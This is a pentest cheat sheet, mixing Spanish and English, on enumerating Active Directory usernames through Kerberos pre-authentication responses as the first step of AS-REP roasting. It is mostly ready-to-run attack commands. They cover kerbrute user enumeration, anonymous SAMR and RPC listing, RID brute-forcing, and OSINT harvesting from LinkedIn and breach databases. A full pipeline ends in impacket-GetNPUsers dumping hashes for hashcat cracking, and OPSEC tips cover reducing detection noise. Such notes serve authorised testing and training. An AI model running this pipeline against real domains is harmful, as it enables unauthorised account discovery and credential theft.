---
aliases:
  - Username Enum AS-REP
  - kerbrute userenum
  - Pre-Auth Username Validation
tags:
  - technique/credential-access
  - technique/discovery
  - asset/active-directory
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[AS-REP Roasting]]"
---
# AS-REP Roasting - Username Enumeration

---

## kerbrute userenum

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `kerbrute userenum --dc <DC> -d corp.local users.txt` | Validate usernames via Kerberos pre-auth | Sin creds. |
| `kerbrute userenum --dc <DC> -d corp.local users.txt -o valid.txt` | Output a file | Pipeline. |
| `kerbrute userenum --dc <DC> -d corp.local users.txt -t 100` | 100 threads | Performance. |
| `kerbrute userenum --dc <DC> -d corp.local users.txt --downgrade` | Force RC4 | Edge legacy. |
^asrep-userenum-kerbrute

**Cómo funciona:** envía AS-REQ. KDC responde:
- `KDC_ERR_PREAUTH_REQUIRED` → user **EXISTE** (pre-auth obligatorio).
- `KDC_ERR_C_PRINCIPAL_UNKNOWN` → user **NO existe**.
- `AS-REP returned` → user existe **+ DONT_REQ_PREAUTH set** (jackpot — directo a roast).

```bash
# Standard pipeline
kerbrute userenum --dc <DC> -d corp.local usernames.txt -o valid.txt

# Output:
# [+] VALID USERNAME: jsmith@corp.local
# [+] [Bonus] AS-REP roastable: legacy_svc@corp.local
```

---

## Username List Sources

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `nxc smb <DC> -u '' -p '' --users` | Null SAMR enum | Si null permitido. |
| `rpcclient -U "" <DC> -N -c 'enumdomusers'` | RPC anonymous | Alt. |
| `enum4linux-ng -U <DC>` | Anonymous comprehensive | Bulk. |
| `nxc smb <DC> -u u -p p --rid-brute 10000` | RID brute (auth) | Post-foothold. |
| `python3 linkedin2username.py -c "<Company>" -u u -p pass -n corp.local` | OSINT generation | Pre-engagement. |
| `username-anarchy -i names.txt > usernames.txt` | Permutations | Standard. |
| `cp /usr/share/seclists/Usernames/Names/names.txt usernames.txt` | SecLists baseline | Generic. |
| `cewl https://corp.com -d 3 -m 5 -w cewl.txt` | Crawl public site | Pattern hints. |
^asrep-userenum-sources

---

## OSINT Pipeline

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `python3 linkedin2username.py -c "<Company>" -u atacante -p pass -n corp.local` | LinkedIn employees → username candidates | Pre-engagement. |
| `theHarvester -d corp.com -b google,bing,linkedin` | Multi-source emails | OSINT. |
| `dehashed -e corp.com` (CLI) | Emails en breach DBs | Patterns + creds. |
| `curl -s 'https://crt.sh/?q=%25.corp.com&output=json' \| jq -r '.[].name_value'` | Subdomains via cert transparency | Adjacent. |
^asrep-userenum-osint

```bash
# Pipeline OSINT → AS-REP roast
git clone https://github.com/initstring/linkedin2username
python3 linkedin2username.py -c "Target Co" -u atacante -p pass -n corp.local

# Aggregate
cat *.txt | sort -u > all_users.txt

# Validate via Kerberos (no auth)
kerbrute userenum --dc <DC> -d corp.local all_users.txt -o valid.txt

# Filter usernames only (no @domain)
awk '{print $NF}' valid.txt | sed 's/@.*//' > clean_users.txt

# AS-REP roast
impacket-GetNPUsers corp.local/ -dc-ip <DC> \
  -usersfile clean_users.txt -no-pass \
  -format hashcat -outputfile asrep.hash
```

---

## Common Naming Patterns

| **Patrón** | **Ejemplo** | **Frecuencia** |
|:---:|:---:|:---:|
| `firstname.lastname` | `john.smith` | Más común. |
| `firstinitiallastname` | `jsmith` | Común. |
| `firstinitial.lastname` | `j.smith` | Común. |
| `firstnamelastname` | `johnsmith` | Común. |
| `lastnamefirstinitial` | `smithj` | Edge. |
| `firstname` solo | `john` | Edge. |
| Contractor prefix | `c-jsmith`, `con.jsmith` | Org grandes. |
| Numeric suffix | `jsmith123`, `jsmith01` | Duplicates. |
| Service patterns | `svc-iis`, `svc.sql`, `service_db` | Service accounts. |
| Legacy migrations | `_<old-domain>_jsmith` | Cross-forest migration. |
^asrep-userenum-patterns

```bash
# Generator inline desde "First Last" lines
cat names.txt | while IFS=' ' read first last; do
  fl=$(echo "$first" | tr '[:upper:]' '[:lower:]')
  ll=$(echo "$last" | tr '[:upper:]' '[:lower:]')
  fi=${fl:0:1}
  echo "${fl}.${ll}"
  echo "${fi}.${ll}"
  echo "${fi}${ll}"
  echo "${fl}${ll}"
  echo "${ll}${fi}"
  echo "${fl}"
done | sort -u > usernames.txt

# username-anarchy alt
./username-anarchy -i names.txt > usernames.txt
```

---

## Cross-Reference: Kerbrute Detects AS-REP Inline

```bash
# Kerbrute output diferencia:
# [+] VALID USERNAME: jsmith@corp.local        ← user existe (pre-auth required)
# [!] AS-REP returned for legacy_svc@corp.local ← AS-REP ROASTABLE inline

# Bonus: parse kerbrute output para AS-REP-only
kerbrute userenum --dc <DC> -d corp.local usernames.txt -o valid.txt 2>&1 |
  grep "AS-REP returned" | awk '{print $5}' | sed 's/@.*//' > asrep_only.txt
```

---

## OPSEC: Kerbrute vs Bulk Roast

| **Aspecto** | **kerbrute first** | **Bulk roast directo (sin filter)** |
|:---:|:---:|:---:|
| Events 4768 | 1 per user (todos) | 1 per user (todos) |
| Locks accounts | NO (kerbrute sin password) | NO (sin password) |
| Speed | Fast (~1000/seg) | Slower (single tool) |
| Output | Validated users + bonus AS-REP detect | AS-REP-only |
| Best practice | Kerbrute first → narrow list → roast valid | Direct waste si lista grande inválida |
^asrep-userenum-opsec

**Recomendación:** **siempre kerbrute first**. Filter usernames → roast solo valid users. Reduce noise + faster.

---

## Common Errors

| **Error** | **Causa** | **Fix** |
|:---:|:---:|:---:|
| Kerbrute timeout | DC no reachable | Test puerto 88. |
| Solo `KDC_ERR_C_PRINCIPAL_UNKNOWN` | Wordlist totalmente inválida | Try OSINT-generated list. |
| 1 user lockeado durante kerbrute | Bug raro (kerbrute no debería) | Skip user + continue. |
| `AS-REP returned for ALL users` | Domain con pre-auth disabled global (rare misconfig) | Audit domain default. |
| `Connection refused` | Firewall block 88 | Port test + alt DC. |
^asrep-userenum-errors

---
